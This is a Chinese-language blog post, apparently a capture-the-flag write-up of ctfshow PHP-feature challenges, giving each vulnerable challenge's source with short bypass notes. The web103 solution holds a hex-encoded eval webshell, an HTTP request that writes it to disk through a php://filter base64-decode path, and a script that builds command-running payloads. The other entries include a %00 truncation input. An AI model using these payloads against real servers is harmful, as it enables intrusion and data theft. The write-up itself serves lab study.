---
title: php特性刷题
description: 一些php特性奇奇怪怪的绕过~
date: '2024-9-12 19:00'
abbrlink: 8dcacc76
---
---



---



> ## web99

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?> 
```

`in_array函数缺陷,第三个参数未设置为true,弱比较绕过!`

> **web102**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}


?> 
```

```php
is_numeric()函数缺陷
    
```

> **Web103**,不能直接出现php,直接用短标签代替

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 21:03:24

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);//注意这行代码,前面要填充2个垃圾字符才行
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```

```php
//wp

is_numeric("0x1234");

在PHP 5下返回true, 在PHP 7下返回false, 去掉前面的0x, 刚好能用hex2bin恢复成字符串

$shell = '<?php eval($_GET["cmd"]); ?>';
var_dump(bin2hex($shell));

得到

3c3f706870206576616c28245f4745545b22636d64225d293b203f3e

所以

v1 = hex2bin
v2 = 0x3c3f706870206576616c28245f4745545b22636d64225d293b203f3e
v3 = 1.php

PHP 7 中v2只是是纯数字或者含有一个e 虽说经过base64能构造出来, 但是不能保证有解

POST /?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

v1=hex2bin

```

`EXP`

```php
<?php
$shell1 = "<?=`cat *`;";
$shell1=base64_encode($shell1);
$shell1 = substr($shell1, 0, -1);
echo $shell1;
var_dump(bin2hex($shell1));

echo '-------------------------';
$shell2 = "<?=`tac *`;";
$shell2=base64_encode($shell2);
$shell2 = substr($shell2, 0, -1);
echo $shell2;
var_dump(bin2hex($shell2));
```

> **Web105**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:34:07

*/

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?> 
```

`wp`

```php


    本题考查变量覆盖和die()的知识

    $$a = $$b可以类似于，将$a的地址指向$b

    所以无论$b怎么改变值，$a的值都会和$b一样

    die()函数虽然会终止程序，但同时也会输出括号内的终止提示信息

    本题利用变量覆盖和die()函数的特性
        先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=>flag的地址
        再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=>flag的地址
        此时无论进入哪个die()函数，都可以输出$flag的值


```

> **Web108** ereg 函数绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:53:55

*/


highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?> 
```

`int ereg(string pattern, string originalstring, [array regs])`函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回t1,否则,则返回0，且搜索对大小写敏感

`ereg()`函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数

直接传入 `?c=a%00778`

> **Web111** GLOBALS全局变量

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 02:41:40

*/

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?> 
```

`GLOBALS`全局变量关键字,var_dump(GLOBALS)可以输出当前目录下所有php文件的变量

> **Web115**数字绕过(恶心!)

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:08:19

*/

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} 
```

